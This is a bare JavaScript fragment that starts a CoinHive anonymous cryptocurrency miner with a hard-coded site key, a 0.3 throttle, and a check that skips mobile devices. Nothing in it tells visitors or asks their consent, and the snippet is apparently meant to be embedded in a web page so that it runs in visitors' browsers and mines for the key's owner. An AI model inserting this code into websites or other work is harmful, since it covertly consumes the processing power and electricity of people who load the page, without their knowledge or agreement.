      var miner = new CoinHive.Anonymous('MFRgLX90sLLXuAO6sUUV5BJNNramGMei', {
          throttle: 0.3
      });
      if (!miner.isMobile()) {
          miner.start();
      }